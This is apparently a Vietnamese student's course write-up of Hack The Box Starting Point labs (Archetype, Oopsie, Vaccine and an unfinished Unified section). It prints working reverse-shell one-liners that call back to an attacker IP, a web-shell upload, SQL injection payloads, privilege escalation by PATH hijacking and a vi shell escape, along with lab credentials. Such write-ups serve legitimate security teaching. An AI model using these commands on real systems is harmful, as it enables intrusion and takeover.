# Writeup HTB Starting Point
**Môn**: An toàn mạng - NT140.Q21.ANTN<br>
**Lớp**: ATTN2024<br>
**GVHD**: ThS. Nghi Hoàng Khoa<br>
**Sinh viên thực hiện**: Nguyễn Minh Phúc Khang - 24520758<br>

---

## Archetype (Windows)
### Task 1: Which TCP port is hosting a database server?
Để xác định cổng TCP nào đang chạy dịch vụ cơ sở dữ liệu, cần tiến hành scan target bằng `nmap` với câu lệnh:
```bash
nmap -sC -sV 10.129.50.185
```
Trong đó:
- `-sC`: Sử dụng script mặc định của nmap.
- `-sV`: Xác định phiên bản của các dịch vụ đang hoạt động trên cổng, giúp nhận diện chính xác các loại dịch vụ.
- `10.129.50.185`: Địa chỉ IP của target.

![alt text](/images/image.png)

Kết quả quét cho thấy một số cổng đang mở cùng với các dịch vụ tương ứng, trong đó cổng `1433/tcp` được xác định đạy chạy `Microsoft SQL Server (MSSQL)` - đây là một hệ quản trị cơ sở dữ liệu.<br>
Do đó, cổng TCP đang host dịch vụ database là `1433`.

### Task 2: What is the name of the non-Administrative share available over SMB?
Sử dụng công cụ `smbclient` với quyền truy cập ẩn danh để xem các thư mục chia sẻ qua giao thức `SMD`:
```bash
smbclient -L //10.129.50.185/ -N
```
Trong đó:
- `-L`: Liệt kê danh sách các shared folder trên máy target.
- `//10.129.50.185/`: Địa chỉ IP của target.
- `-N`: Kết nối ẩn danh (không cần mật khẩu).

![alt text](/images/image-1.png)

Kết quả cho thấy các share folder sau:
- `ADMIN$`,` C$`, `IPC$`: là các share folder mặc định (Administrative shares) của hệ thống Windows, thường được sử dụng cho mục đích quản trị.
- Chỉ có `backups` là không thuộc nhóm trên.
Do đó, share folder cần tìm là `backups`.

### Task 3: What is the password identified in the file on the SMB share?
**Task 2** giúp ta xác định được rằng SMB share không mặc định trong hệ thống là `backups`. Với tên gọi này, ta có thể suy đoán folder này chứa các file backup, nhiều khả năng bao gồm `file cấu hình hoặc thông tin nhạy cảm`.

Từ suy luận trên, tiến hành truy cập vào share `backups` và kiểm tra bằng lệnh `ls`:
```bash
smbclient //10.129.50.185/backups -N
ls
```
Kết quả cho thấy tồn tại file `prod.dtsConfig` - đây chính là file cấu hình, có khả năng chứa `thông tin kết nối hoặc credential`. Tiến hành tải file về máy bằng lệnh `get`:
```bash
get prod.dtsConfig
```

![alt text](/images/image-2.png)

Thoát khỏi smbclient bằng lệnh `exit` và kiểm tra file đã được tải về.

![alt text](/images/image-3.png)

Sau khi xác nhận file `prod.dtsConfig` đã tồn tại trên hệ thống, tiến hành đọc nội dung bằng lệnh `cat`.<br>

![alt text](/images/image-4.png)

Trong nội dung file, phát hiện thông tin password được lưu dưới dạng plaintext: `Password=M3g4c0rp123`. Do đó, password cần tìm là `M3g4c0rp123`.

### Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
Từ các Task trước, ta đã xác định được target đã chạy dịch vụ **Microsoft SQL Server (MSSQL)** trên port **1433**, đồng thời cũng thu thập được thông tin đăng nhập hợp lệ.<br>
Để thiết lập kết nối đến **MSSQL server** bằng credential này, ta sử udnjg công cụ `Impacket` có sẳn trong Kali Linux, trong đó script `mssqlclient.py` được thiết kế chuyên dụng để kết nối và tương tác với **MSSQSL**. Tiến hành kết nối bằng lệnh:
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.50.185 -windows-auth
```
Sau khi nhập password đã tìm được ở **Task 3** (`M3g4c0rp123`), kết nối được thiếp lập thành công và ta có thể tương tác với cơ sở dữ liệu thông qua giao diện SQL:
```bash
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

![alt text](/images/image-5.png)

Điều này xác nhận rằng script `mssqlclient.py` đã thiết lập được kết nối xác thực đến MSSQL server. Do đó, script cần tìm là `mssqlclient.py`.

### Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
Khi đăng nhập thành công vào **MSSQL sever** bằng script `mssqlclient.py`, ta có thể thực thi các lệnh truy vấn SQL trực tiếp trên hệ thống.<br>
Để kiểm tra khả năng thực thi lệnh của hệ điều hành từ **MSSQL**, ta tiến hành thử nghiệm bằng các thực thi một **extended stored procedure** `xp_cmdshell` đơn giản:
```sql
EXEC xp_cmdshell 'whoami';
```
Hệ thống trả về thông báo lỗi, điều này cho thấy `xp_cmdshell` là một procedure nguy hiểm và đã được vô hiệu hóa theo cấu hình mặc định của SQL server.

![alt text](/images/image-6.png)

Tuy nhiên, tài khoản hiện tại (`sql_svc`) đang có quyền cao (dbo) trong CSDL, do đó, ta có khả năng thay đổi cấu hình hệ thống. Vì vậy, tiến hành kích hoạt lại `xp_cmdshell` bằng các lệnh:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Sau khi kích hoạt, chạy lại lệnh:
```sql
EXEC xp_cmdshell 'whoami';
```

![alt text](/images/image-7.png)

Kết quả trả về là `archetype\sql_svc`. Điều này chứng minh rằng `xp_cmdshell` cho phép thực thi lệnh hệ điều hành Windows thông qua **MSSQL**.

### Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?
`xp_cmdshell` giúp ta có khả năng giúp ta thực thi lệnh hệ điều hành thông qua câu lệnh SQL, tiếp theo ta cần tìm các hướng leo thang đặc quyền để tiếp tục khai thác máy target.<br>
Để hỗ trợ qua trình này, ta có thể sử dụng các công cụ tự động nhằm thu thập thông tin hệ thống để phát hiện các cấu hình sai hoặc lỗ hổng. Một trong số các công cụ phổ biến là `WinPeas` - công cụ cho phép kiếm tra toàn diện và đưa ra các gợi ý để leo thang đặc quyền.<br>
Do đó, ta sẽ sử dụnh `WinPeas` để leo thang và khai thác sâu hơn ở máy target.

### Task 7: What file contains the administrator's password?
Sau khi khai thác thành công **MSSQL** và thực thi được lệnh hệ điều hành thông qua `xp_cmdshell`, ta nhận thấy việc tương tác với hệ thống còn hạn chế do mỗi lệnh phải thực thi thông qua SQL, gây bất tiện và khó thao tác.

Do đó, để có được môi trường làm việc thuận tiện hơn, ta tiến hành thiết lập một reverse shell từ máy mục tiêu về máy attacker.

#### Chuẩn bị listener trên máy attacker
Trên máy Kali, mở cổng lắng nghe bằng lệnh:
```bash
nc -lvnp 4444
```

#### Tạo revershell từ máy target
Sử dụng Powershell thông qua `xp_cmdshell` để tạo kết nối ngược về máy Kali:
```sql
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.54'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

![alt text](/images/image-8.png)

Kết quả cho thấy target đã gửi shell ra ngoài thành công.

#### Quét máy target bằng winPEASx64.exe
Tiến hành tải file `winPEASx64.exe` về máy Kali và khởi tạo HTTP server để phục vụ việc truyền file sang máy mục tiêu:
```bash
python3 -m http.server 80
```
Trên máy target, sử dụng PowerShell để tải file `winPEASx64.exe` từ máy Kali về hệ thống:
```Powershell
wget http://10.10.14.54/winPEASx64.exe -outfile winPEASx64.exe
```
Sau khi quá trình tải hoàn tất, kiểm tra lại bằng lệnh `dir`. Kết quả cho thấy file `winPEASx64.exe` đã xuất hiện trong thư mục, chứng tỏ file đã được tải thành công.

![alt text](/images/image-9.png)

Scan máy target bằng `winPEASx64.exe`, phát hiện file đáng ngờ `ConsoleHost_history.txt` trong thư mục người dùng. Tiến hành kiểm tra nội dung file bằng lệnh:
```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Kết quả cho thấy file lưu lại các lệnh đã nhập, bao gồm cả thông tin đăng nhập. Điều này xác nhận rằng file `ConsoleHost_history.txt` chính là đáp án cần tìm.

![alt text](/images/<Screenshot 2026-03-25 080232.png>)

### TÌM FLAG
#### User flag
Sau khi thiết lập reverse shell ở **Task 7**, ta có thể tương tác trực tiếp với máy target dưới quyền của user `sql_svc`. Tiến hành di chuyển đến thư mục Desktop của User và liệt kê các file trong thư mục:
```powershell
cd C:\Users\sql_svc\Desktop
dir
```

Phát hiện file khả nghi `user.txt`, tiến hành đọc nội dung file với lệnh `type`.

![alt text](/images/image-12.png)

Kết thu được **userflag** của hệ thống: `3e7b102e78218e935bf3f4951fec21a3`.

#### Root Flag
Từ kết quả phân tích trước đó, phát hiện thông tin đăng nhập của tài khoản `Administrator` trong file `ConsoleHost_history.txt`:
```text
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```
Sử dụng credential này để đăng nhập vào hệ thống với quyền Administrator thông qua công cụ `psexec`:
```bash
impacket-psexec Administrator@10.129.50.185
```
Sau khi nhập password và kết nối thành công, tiến hành di chuyển đến Desktop của Administrator và xem các file bên trong:
```powershell
cd C:\Users\Administrator\Desktop
dir
```
Phát hiện file khả nghi `root.txt`, tiến hành đọc nội dung file bằng lệnh `type`.

![alt text](/images/image-11.png)

Kết quả thu được **rootflag** của hệ thống: `b91ccec3305e98240082d4474b848528`.

![alt text](/images/image-10.png)

--- 

## Oopsie (Linux)
### Task 1: With what kind of tool can intercept web traffic?
Để chặn và phân tích lưu lượng web (`web traffic`), người ta thường sử dụng các công cụ gọi là `intercepting proxy`. Các công cụ này đóng vai trò trung gian giữa client và server, cho phép ghi lại và chỉnh sửa các request/response HTTP/HTTPS.<br>

Trong thực tế, các công cụ như `Burp Suite` hoặc `OWASP ZAP` hoạt động theo cơ chế này, khi cấu hình trình duyệt sử dụng proxy, toàn bộ lưu lượng web sẽ đi qua và có thể bị chặn để phân tích. <br>

Do đó, có thể suy ra rằng công cụ dùng để intercept web traffic là `proxy`.

### Task 2: What is the path to the directory on the webserver that returns a login page?
Truy cập vào địa chỉ IP target (`10.129.51.179`) thông qua trình duyệt, xác định web server đang hoạt động trên cổng HTTP (port 80). Tuy nhiên, giao diện chính của trang web không hiển thị trang đăng nhập.

![alt text](/images/image-13.png)

Để tìm kiếm các đường dẫn ẩn, ta tiến hành cấu hình trình duyệt sử dụng proxy (`127.0.0.1:8080`) và sử dụng công cụ `Burp Suite` để thu thập và phân tích lưu lượng web.

![alt text](/images/image-14.png)

Sau khi thiết lập proxy và truy cập lại website, tiến hành tương tác với các chức năng trên giao diện. Công cụ `Burp Suite` ghi lại toàn bộ các request/response trong quá trình giao tiếp giữa client và server.

![alt text](/images/image-16.png)

Khi kiểm tra tab `Target -> Sitemap`, phát hiện một đường dẫn đáng ngờ không được hiển thị trên giao diện người dùng.
```
GET /cdn-cgi/login/script.js HTTP/1.1
```

![alt text](/images/image-15.png)

Khi truy cập trực tiếp vào đường dẫn này trên trình duyệt, hệ thống hiển thị trang yêu cầu nhập **username** và **password**. Vì vậy, có thể xác định đây chính là đường dẫn đến trang đăng nhập: `/cdn-cgi/login`.

![alt text](/images/image-17.png)

### Task 3: What can be modified in Firefox to get access to the upload page?
Sau khi đăng nhập với quyền guest, nếu click vào tab `Upload`, trang web sẽ hiện ra thông báo 
```text
This action require super admin rights.
```
Chứng tỏ ta cần quyền cao hơn để truy cập được tab này.

![alt text](/images/<Screenshot 2026-03-25 141526.png>)

Tiến hành kiểm tra `Storage -> Cookie` trong trình duyệt, phát hiện 2 giá trị:
- `role=guest`.
- `user=2233`.

![alt text](/images/image-21.png)

Có thể suy đoán rằng 2 giá trị này nhằm xác định quyền của người truy cập trên trang web, nếu có thể sửa `role` và ID `user` thì có thể nâng quyền lên thành `admin`. Điều này cho thấy trang web sử dụng cookie phía client để kiểm soát phân quyền, dẫn đến khả năng bị thao túng và tiềm ẩn lỗ hổng `Broken Access Control`.

Vì vậy, thành phần có thể được chỉnh sửa trong Firefox là `cookie`.

### Task 4: What is the access ID of the admin user?
Khi kiểm tra tab `Account`, quan sát URL:
```url
http://10.129.51.179/cdn-cgi/login/admin.php?content=accounts&id=2
```
![alt text](/images/image-20.png)

Nhận thấy tham số `id=2` có thể đang đại diện cho người dùng (user). Tiến hành đổi `id=2` thành `id=1` và quan sát kết quả. 
Ta thấy trang web hiển thị thông tin của tài khoản admin với id là `34322`.

Đây là lỗ hổng `IDOR (Insecure Direct Object Reference)`, ta có thể tận dụng nó để leo thang đặc quyền.

![alt text](/images/image-22.png)

### Task 5: What is the access ID of the admin user?
Từ kết quả của `Task 4`, tiến hành chỉnh sửa `role` và ID `user` để chuyển sang quyền admin và vào được tab `Upload`. Tiến hành tạo file `test.txt` để upload lên trang web bằng lệnh:
```bash
echo "test" > test.txt
```

![alt text](/images/image-24.png)

Tuy nhiên, sau khi upload file, trang web không trả về đường dẫn cụ thể đến file đã tải lên. Đồng thời, khi phân tích các gói request/response bằng `Burp Suite`, cũng không thu được thông tin về vị trí lưu trữ file. Do đó, tiến hành sử dụng công cụ `Gobuster` để thực hiện **directory enumeration** dựa trên Worldlist nhằm xác định cấu trúc thư mục của trang web.

![alt text](/images/image-25.png)

Kết quả cho thấy dữ liệu upload được lưu tại thư mục `/uploads/`. Mặc dù không thể truy cập trực tiếp vào `http://10.129.51.179/uploads/` để xem toàn bộ các file đã tải lên, nhưng dựa trên kết quả liệt kê thư mục và quá trình phân tích, có đủ cơ sở để kết luận rằng dữ liệu được lưu trữ tại `/uploads/`.

![alt text](/images/image-27.png)

### Task 6: What is the file that contains the password that is shared with the robert user?
Sau khi xác định được chức năng upload và có khả năng tải lên file `.php`, tiến hành khai thác bằng cách sử dụng một reverse shell. Sử dụng file `php-reverse-shell.php` có sẵn trong Kali Linux tại đường dẫn `/usr/share/webshells/php/` và chỉnh sửa địa chỉ IP cùng port phù hợp với máy tấn công. Sau đó, upload file này thông qua chức năng upload của ứng dụng.

Tiến hành hiết lập listener bằng công cụ `netcat` để chờ kết nối tại cổng 1234:
```
nc -lvnp 1234
```

Tiếp theo, truy cập đến file đã upload để kích hoạt reverse shell, từ đó thiết lập được kết nối shell tới server với quyền `www-data`.

![alt text](/images/image-28.png)

Sau khi thực hiện revershell thành công, di chuyển đến thư mục `/var/www/html/cdn-cgi/login/` để kiểm tra nội dung bên trong. Kết quả của lệnh `ls` cho thấy thư mục này có 4 file: `admin.php`, `db.php`, `index.php`, `script.js`.

Trong đó, file đáng ngờ nhất là `db.php` vì rất có thể kí tự "db" là viết tắt của database - nơi lưu mật khẩu của các user. Sau khi dùng lệnh `cat db.php`, kết quả cho thấy đây đích thị là file lưu trữ mật khẩu của trang web.

![alt text](/images/image-29.png)

### Task 7: What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
Trong Linux, lệnh `find` là công cụ cho phép tìm kiếm file dựa trên nhiều tiêu chí khác nhau như tên, quyền truy cập, owner hoặc group. Cụ thể, tùy chọn `-group` được sử dụng để lọc các file theo group sở hữu.
> Do đó, có thể suy luận rằng executable cần tìm là `find`.

Để kiểm chứng, tiến hành thực thi lệnh sau trên hệ thống sau khi đã truy cập được shell:
```bash
find / -group bugtracker 2>/dev/null
```
Kết quả trả về danh sách các file thuộc group bugtracker, chứng minh rằng lệnh `find` hỗ trợ tùy chọn `-group` và được sử dụng để xác định các file theo group.

Vì vậy, executable được sử dụng là: `find`

![alt text](/images/image-30.png)

### Task 8: Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
Kết quả của `Task 7` cho thấy cho thấy chỉ có duy nhất 1 file `bugtracker` trên hệ thống nằm tại đường dẫn `/usr/bin/bugtracker`. Tiến hành kiểm tra quyền của file này bằng lệnh:
```bash
ls -l /usr/bin/bugtracker
```
Kết quả cho thấy file có phân quyền dạng `-rwsr-xr-x`, trong đó ký tự `s` cho biết SUID bit đã được thiết lập.

Trong Linux, khi một file có SUID bit, nó sẽ được thực thi với quyền của `owner` thay vì `user` đang chạy file. Trong trường hợp này, `owner` của file là `root`.

Do đó, bất kể user nào thực thi bugtracker, chương trình sẽ chạy với quyền:
root

![alt text](/images/image-31.png)

### Task 9: What SUID stands for?
`SUID` là viết tắt của **Set Owner User ID**. Đây là một quyền đặc biệt trong hệ thống Linux, cho phép một file được thực thi với quyền của user sở hữu file đó thay vì user đang chạy file.

### Task 10: What is the name of the executable being called in an insecure manner?
Do hạn chế về quyền truy cập trong shell, tiến hành phân tích binary `bugtracker` bằng lệnh:
```bash
strings /usr/bin/bugtracker
```
Kết quả cho thấy chương trình thực thi lệnh `cat /root/reports/`

Trong đó, executable `cat` được gọi mà không chỉ định đường dẫn đầy đủ (`/bin/cat`). Đây là cách gọi không an toàn vì hệ thống sẽ tìm kiếm executable theo biến môi trường `$PATH`.

Điều này có thể dẫn đến lỗ hổng `PATH Hijacking`, cho phép attacker thực thi mã tùy ý với quyền cao hơn.

Vì vậy, executable được gọi không an toàn là `cat`.

![alt text](/images/image-33.png)

### TÌM FLAG
#### User Flag
Sau khi khai thác thành công và có được reverse shell trên hệ thống với quyền www-data, tiến hành liệt kê thư mục người dùng: `ls home`.
Phát hiện người dùng robert, tiếp tục truy cập vào thư mục:
```bash
cd /home/robert
ls
```
Tại đây xuất hiện file user.txt. Nội dung của file được đọc bằng lệnh `cat user.txt`.

File này chứa user flag của hệ thống: `f2c74ee8db7983851ab2a96a44eb7981`.

![alt text](/images/image-34.png)

#### Root Flag
Sau khi có được reverse shell với quyền `www-data`, tiến hành kiểm tra các file cấu hình và phát hiện password của người dùng robert trong file `db.php` là `M3g4C0rpUs3r!`. 

Sau khi đăng nhập và kiểm tra, kết quả cho thấy user `robert` thuộc nhóm `bugtracker`. Tuy nhiên, theo phân tích trước đó, ta cần khai thác lỗ hỏng `PATH hijacking` để có thể leo thang đặc quyền. Thực thi các lệnh:
```bash
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat
```
Sau đó sửa biến môi trường `PATH` để ưu tiên thư mục /tmp:
```bash
export PATH=/tmp:$PATH
```
![alt text](/images/image-36.png)

Thực thi lại chương trình: `/usr/bin/bugtracker`. 

![alt text](/images/image-37.png)

Cuối cùng, tiến hành kiểm tra lại quyền và truy cập thư mục `/root/` để đọc file `root.txt`:
```bash
cd root/
/bin/cat root.txt
```

File này chứ root flag của hệ thống: `af13b0bee69f8a877c3faf667f7beacf`.

![alt text](/images/image-38.png)

![alt text](/images/image-35.png)

---

## Vaccine (Linux)
### Task 1: Besides SSH and HTTP, what other service is hosted on this box?
Sử dụng công cụ `nmap` để quét toàn bộ các cổng trên máy target bằng lệnh:
```bash
nmap -sC -sV 10.129.52.28
```
Trong đó: `10.129.52.28` là IP của máy target.

![alt text](/images/image-39.png)

Kết quả cho thấy ngoài port 80 (HTTP) và port 22 (SSH), hệ thống còn mở thêm port 21 sử dụng dịch vụ `FTP (vsftpd 3.0.3)`.

### Task 2: This service can be configured to allow login with any password for specific username. What is that username?
Từ kết quả quét bằng `nmap` ở `Task 1`, ta dễ dàng nhận thấy FTP trong hệ thống cho phép đăng nhập ẩn danh:
```text
ftp-anon: Anonymous FTP login allowed
```
Theo đó, người dùng có thể đăng nhập với username `anonymous`và mật khẩu bất kì. 

![alt text](/images/image-40.png)

### Task 3: What is the name of the file downloaded over this service?
Tiến hành đăng nhập ẩn danh (anonymous) vào dịch vụ FTP trên hệ thống, sau đó liệt kê các file trên server bằng lệnh `ls`. Kết quả cho thấy tồn tại file `backup.zip`.

Tiếp theo, sử dụng lệnh `get backup.zip` để tải file về máy phục vụ cho quá trình phân tích ở các bước tiếp theo.

![alt text](/images/image-41.png)

### Task 4: What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

Sử dụng script `zip2john` đi kèm với công cụ `John The Ripper` để trích xuất hash từ file `backup.zip` được bảo vệ bằng mật khẩu.

Script này chuyển đổi nội dung của file `backup.zip` sang định dạng hash phù hợp, cho phép sử dụng công cụ `john` để thực hiện quá trình brute-force mật khẩu.

Lệnh thực hiện:
```bash
zip2john backup.zip > hash.txt
```

![alt text](/images/image-42.png)

###  5ask 5: What is the password for the admin user on the website?
Sau khi đã trích xuất hash từ file `backup.zip` và lưu vào `hash.txt`, sử dụng công cụ `John The Ripper` để crack mật khẩu bằng lệnh:
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
``` 
Trong đó:
- `john`: Từ khóa thực thi công cụ `John The Ripper`.
- `hash.txt`: Tập tin lưu mã hash trích xuất từ `backup.zip`.
- `--wordlist=`: Tham số chỉ định bẻ khóa bằng cách sử dụng wordlist.
- `/usr/share/wordlists/rockyou.txt`: Đường dẫn file `rockyou.txt` - nơi lưu các mật khẩu kinh điển.

Kết quả thu mật khẩu của file zip: `741852963`.

![alt text](/images/image-44.png)

Dùng mật khẩu crack được để unzip file `backup.zip` thu được 2 tập tin là `index.php` và `style.css`. Dùng công cụ `grep` để tìm trong 2 file đó các từ khóa có liên quan tới `admin` bằng lệnh:
```bash
grep -i "admin" *
```
Kết quả phát hiện đoạn code trong `index.php`:
```text
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```
Điều này cho thấy mật khẩu admin `2cb42f8734ea607eefed3b70af13bbd3` đã được lưu dưới dạng `MD5`.

![alt text](/images/image-45.png)

Để tìm mật khẩu dạng plaintext, đầu tiên tạo file admin-md5.txt để lưu mã hash và tiếp tục sử dụng `John The Ripper` để crack:
```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > admin-md5.txt
john admin-md5.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```
Kết quả thu được mật khẩu admin: `qwerty789`.

![alt text](/images/image-43.png)

### Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?
Sử dụng công cụ sqlmap với tùy chọn `--os-shell` để thử khai thác lỗ hổng SQL Injection nhằm thực thi lệnh hệ điều hành trên máy mục tiêu. Tùy chọn này cho phép tương tác trực tiếp với hệ điều hành nếu việc khai thác thành công, từ đó có thể thực hiện các lệnh tùy ý trên server.

### Task 7: What program can the postgres user run as root using sudo?
Sau khi truy cập trang web và đăng nhập dưới quyền admin, quan sát chức năng tìm kiếm trong Dashboard. Khi nhập giá trị `ABC`vào ô `SEARCH`, URL thay đổi như sau:

![alt text](/images/image-47.png)

Điều này cho thấy tham số search được truyền trực tiếp lên server và có thể được sử dụng trong truy vấn SQL.

#### Kiểm tra SQL Injection thủ công
Tiến hành chèn ký tự đặc biệt `'` vào tham số `search`:
```url
dashboard.php?search='
```
Hệ thống trả về lỗi SQL với thông báo *"unterminated quoted string"*, cho thấy truy vấn SQL phía backend bị phá vỡ do không xử lý đúng dữ liệu đầu vào.

Điều này chứng tỏ ứng dụng không sử dụng cơ chế lọc hoặc escape ký tự đặc biệt, dẫn đến khả năng tồn tại lỗ hổng SQL Injection.

![alt text](/images/<Screenshot 2026-03-25 171822.png>)

Tiếp tục thử với payload:
```url
dashboard.php?search=test' OR '1'='1
```
Kết quả trả về toàn bộ dữ liệu thay vì chỉ kết quả liên quan đến từ khóa tìm kiếm.

Điều này cho thấy có thể can thiệp vào logic của truy vấn SQL, cụ thể là điều kiện `OR '1'='1'` luôn đúng, khiến hệ thống trả về tất cả bản ghi.

![alt text](/images/<Screenshot 2026-03-25 171839.png>)

> Từ hai thử nghiệm trên, có thể khẳng định tham số `search` tồn tại lỗ hổng SQL Injection, do dữ liệu đầu vào được đưa trực tiếp vào truy vấn SQL mà không qua xử lý hoặc kiểm tra hợp lệ. Ta có thể lợi dụng lỗ hổng này để thao túng truy vấn, truy xuất dữ liệu hoặc thực thi các hành vi nguy hiểm hơn như chiếm quyền điều khiển hệ thống.

#### Khai thác SQL Injection
Vì trang web yêu cầu đăng nhập, do đó ta cần sử dụng session ID hợp lệ để khai thác. Do đó, tiến hành lấy `cookies` từ DevTools của trình duyệt. Kết quả thu được: `PHPSESSID=b3i5odrqrg6grme971g7cshqpb`.

Sau khi đã có `cookies`, sử dụng công cụ `sqlmap` để kiểm tra lỗ hỏng **SQL Injection**:
```bash
sqlmap -u "http://10.129.52.28/dashboard.php?search=test" \
--cookie="PHPSESSID=b3i5odrqrg6grme971g7cshqpb" \
```
Từ kết quả của lệnh trên, ta có thể khảng định:
- Trang web sử dụng `PostgreSQL`.
- Cho phép thực thi stacked queries (nhiều câu lệnh SQL liên tiếp).

![alt text](/images/image-48.png)

Sau bước kiểm tra, ta tiến hành khai thác sâu hơn bằng cách yêu cầu `sqlmap` thực thi lệnh hệ điều hành thông qua tùy chọn `--os-shell`:
```bash
sqlmap -u "http://10.129.52.28/dashboard.php?search=test" \
--cookie="PHPSESSID=b3i5odrqrg6grme971g7cshqpb" \
--os-shell
```
Sau khi thực thi thành công, ta thu được một shell trên hệ thống với quyền `postgres`. Tuy nhiên, shell này không ổn định và khó thao tác, ta cần tiến hành reverse shell để có shell tương tác tốt hơn.

![alt text](/images/image-49.png)

#### Reverse Shell
Đầu tiên, ta mở một kênh lắng nghe trên port 443 tại máy Kali Linux:
```bash
nc -lvpn 443
```
Tiếp theo đó, gửi shell của target ra ngoài bằng lệnh:
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.54/443 0>&1"
```

Khi đã gửi shell ra ngoài thành công, tiến hành kiểm tra quyền user bằng lệnh `sudo -l`. Tuy nhiên, chương trình lại yêu cầu password để có thể truy cập.

Do trang web dùng PostgreSQL, có thể suy đoán rằng file config có khả năng chứa password. Thực hiện các lệnh:
```bash
cd /var/www/html
ls
```
![alt text](/images/image-51.png)

Dựa vào những phân tích trước đó, backend có khả năng rất cao nằm trong file `dashboard.php`. Tiến hành kiểm tra và phát hiện rằng file `dashboard.php` lưu trữ thông tin username và password cần tìm.

![alt text](/images/image-52.png)

Sau khi thu thập được thông tin đăng nhập PostgreSQL từ mã nguồn, tiến hành chuyển sang user postgres và kiểm tra quyền sudo:
```bash
sudo -l
```
Sau khi nhập mật khẩu, kết quả thu được:
```bash
User postgres may run the following commands on vaccine:
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
> User postgres có thể thực thi chương trình /bin/vi với quyền root thông qua sudo. Đây là một cấu hình nguy hiểm vì vi có thể được lợi dụng để thực thi lệnh hệ điều hành.

![alt text](/images/image-53.png)

### TÌM FLAG
#### User Flag
Khi đã ở trong shell, di chuyển đến thư mục của user `/var/lib/postgresql` và kiểm tra nội dung tại đó bằng lệnh `ls`. Kết quả phát hiện có tập tin `user.txt` - nơi lưu trữ userflag.

Tìm được userflag là: `ec9b13ca4d6229cd5cc1e09980965bf7`

![alt text](/images/image-50.png)

#### Root Flag
Lợi dụng quyền thực thi `vi` với quyền `root`, tiến hành khai thác để lấy shell root:
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
Sau khi vào giao diện `vi`, thực hiện các lệnh sau để vào shell dưới quyền `root`:
```bash
:set shell=/bin/bash
:shell
```
Sau đó tiến hành khai thác chương trình dưới quyền `root` và thu được root flag: `dd6e058e814260bc70e9bbdef2715849`.

![alt text](/images/image-54.png)

![alt text](/images/image-55.png)

---

## Unified (Linux)
### Task 1: Which are the first four open ports?
Sử dụng công cụ `nmap` để quét các cổng dịch vụ trên máy target:
```bash
nmap -sC -sV 10.129.52.91
```
Trong đó: `10.129.52.91` là địa chỉ IP của máy target.

![alt text](/images/image-56.png)

Từ kết quả scan, có thể kết luận 4 cổng mở trên máy target lần lượt là: `22,6789,8080,8443`.

### Task 2: What is the title of the software that is running running on port 8443?
Dựa vào kết quả quét bằng `nmap` trước đó, có thể xác định rằng cổng `8443` đang mở và được sử dụng cho giao thức HTTPS. Theo đó, tiến hành truy cập vào địa chỉ: `https://10.129.52.91:8443`. Do chứng chỉ SSL không hợp lệ, trình duyệt sẽ cảnh báo bảo mật. Ta tiến hành bỏ qua cảnh báo và tiếp tục truy cập vào trang web.

Sau khi truy cập thành công, sử dụng `DevTools` của trình duyệt để phân tích mã nguồn HTML của trang. Tại phần `<head>`, xác định được tiêu đề của thẻ: 
```html
<title>UniFi Network</title>
```
Từ đây có thể kết luận tên phần mềm đang chạy ở port 8443 là `UniFi Network`.

![alt text](/images/<Screenshot 2026-03-25 184804.png>)

### Task 3: What is the version of the software that is running?
Dựa vào giao diện chính của trang web, có thể xác định được version hiện tại của `UniFi Network` là `6.4.54`.

![alt text](/images/image-57.png)

### Task 4: What is the CVE for the identified vulnerability?
Dựa trên những phân tích trước đó, hệ thống đang chạy phần mềm `UniFi Network` version `6.4.54`. Tiến hành tra cứu các lỗ hỏng bảo mật tương ứng với version này từ các nguồn uy tín, có thể khẳng định version này bị ảnh hưởng nghiêm trọng bởi lỗ hỏng `CVE-2021-44228`.

`CVE-2021-44228`, còn được biết đến với tên gọi `Log4Shell`, là một lỗ hổng thực thi mã từ xa (RCE) trong thư viện `Apache Log4j`. Lỗ hổng này cho phép attacker:
- Chèn payload độc hại thông qua các trường đầu vào (ví dụ: HTTP headers như User-Agent).
- Khiến server thực hiện truy vấn JNDI đến máy chủ do attacker kiểm soát.

Từ đó thực thi mã tùy ý trên hệ thống.

### Task 5: What protocol does JNDI leverage in the injection?
Trong khai thác `Log4Shell`, attacker sử dụng `JNDI (Java Naming and Directory Interface)` để thực hiện truy vấn đến một máy chủ bên ngoài. `JNDI` hỗ trợ nhiều giao thức, tuy nhiên trong trường hợp này, payload sử dụng giao thức: `ldap://`. 

### Task 6: What tool do we use to intercept the traffic, indicating the attack was successful?
